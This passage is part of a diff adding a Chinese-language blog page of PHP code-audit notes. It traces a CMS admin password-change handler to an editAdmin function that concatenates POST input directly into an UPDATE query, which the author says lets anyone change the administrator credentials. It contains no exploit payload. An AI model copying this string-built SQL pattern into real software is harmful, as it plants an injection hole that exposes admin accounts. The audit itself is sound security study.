+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;send&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">validate</span><span class="o">::</span><span class="na">isNullString</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]))</span> <span class="nx">Tool</span><span class="o">::</span><span class="na">t_back</span><span class="p">(</span><span class="s1">&#39;用户名不能为空&#39;</span><span class="p">,</span><span class="s1">&#39;?a=admin&amp;m=update&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">validate</span><span class="o">::</span><span class="na">isNullString</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="nx">Tool</span><span class="o">::</span><span class="na">t_back</span><span class="p">(</span><span class="s1">&#39;密码不能为空!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=admin&amp;m=update&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">validate</span><span class="o">::</span><span class="na">checkStrEquals</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;notpassword&#39;</span><span class="p">])))</span> <span class="nx">Tool</span><span class="o">::</span><span class="na">t_back</span><span class="p">(</span><span class="s1">&#39;两次密码不一致!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=admin&amp;m=update&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">username</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_edit</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">editAdmin</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$_edit</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;密码修改成功!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=admin&amp;m=update&#39;</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;密码未修改!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=admin&amp;m=update&#39;</span><span class="p">,</span><span class="mi">6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">&#39;admin/public/update.tpl&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">editAdmin</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$_sql</span><span class="o">=</span><span class="s2">&#34;UPDATE
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    my_admin
+</span></span></span><span class="line"><span class="cl"><span class="s2">                SET
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    username=&#39;</span><span class="si">$this-&gt;username</span><span class="s2">&#39;,
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    password=&#39;</span><span class="si">$this-&gt;password</span><span class="s2">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">                WHERE
+</span></span></span><span class="line"><span class="cl"><span class="s2">                    id=1
+</span></span></span><span class="line"><span class="cl"><span class="s2">                LIMIT 1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">parent</span><span class="o">::</span><span class="na">update</span><span class="p">(</span><span class="nv">$_sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>该函数的父类为Model, 位于model\Model.class.php，看一下update函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">update</span><span class="p">(</span><span class="nv">$_sql</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nv">$_sql</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">rowCount</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>调用execute函数去执行sql语句</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">execute</span><span class="p">(</span><span class="nv">$_sql</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_stmt</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$_sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$_stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;SQL语句:&#39;</span><span class="o">.</span><span class="nv">$_sql</span><span class="o">.</span><span class="s1">&#39;&lt;br /&gt;错误信息:&#39;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$_stmt</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/xvsf/tags/php-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP 代码审计</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
